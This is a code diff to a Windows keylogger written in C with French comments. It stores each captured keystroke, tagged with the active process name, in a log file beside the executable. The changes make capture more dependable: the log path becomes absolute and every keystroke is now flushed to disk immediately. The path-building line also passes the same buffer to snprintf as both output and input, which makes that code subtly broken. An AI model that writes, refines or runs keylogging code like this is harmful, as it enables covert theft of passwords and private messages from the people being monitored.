@@ -24,10 +24,22 @@ static const char* get_special_key_name(DWORD vkCode);
 static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);
 
 // Fonction principale
-int main(void)
+int main(int argc, char *argv[])
 {
+    if (argc == 0 || argv[0] == NULL)
+        return 1;
+
+    char log_path[MAX_PATH] = { 0 };
+    GetModuleFileName(NULL, log_path, MAX_PATH);
+    char* last_backslash = strrchr(log_path, '\\');
+    if (last_backslash) {
+        *last_backslash = '\0';
+    }
+    // Construire le chemin complet vers keystrokes.log
+    snprintf(log_path, MAX_PATH, "%s\\keystrokes.log", log_path);
+
     // Ouvrir le fichier log
-    g_logfile = fopen("keystrokes.log", "a");
+    g_logfile = fopen(log_path, "a");
     if (g_logfile == NULL) {
         MessageBox(NULL, "Erreur d'ouverture du fichier log.", "Erreur", MB_ICONERROR);
         return 1;
@@ -43,10 +55,7 @@ int main(void)
 
     // Boucle de message
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
+    while (GetMessage(&msg, NULL, 0, 0)) {}
 
     // Nettoyage
     UnhookWindowsHookEx(g_hook);
@@ -133,8 +142,6 @@ static void log_new_window(const char* process_name)
 // Fonction pour écrire dans le fichier log
 static void write_to_log(const char* str)
 {
-    static int write_count = 0;  // Compteur pour suivre le nombre d'appels
-
     // Obtenir la fenêtre et le processus en premier plan
     HWND foreground_window = GetForegroundWindow();
     DWORD pid;
@@ -156,20 +163,11 @@ static void write_to_log(const char* str)
                 strcpy(g_last_process, process_name);
             }
 			fflush(g_logfile);
-			write_count = 0;
             log_new_window(process_name);
         }
     }
     fprintf(g_logfile, "%s", str);
-
-    // Incrémenter le compteur d'écritures
-    write_count++;
-
-    // Effectuer un fflush tous les 30 appels
-    if (write_count >= 30) {
-        fflush(g_logfile);
-        write_count = 0;  // Réinitialiser le compteur
-    }
+    fflush(g_logfile);
 }
 
 static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
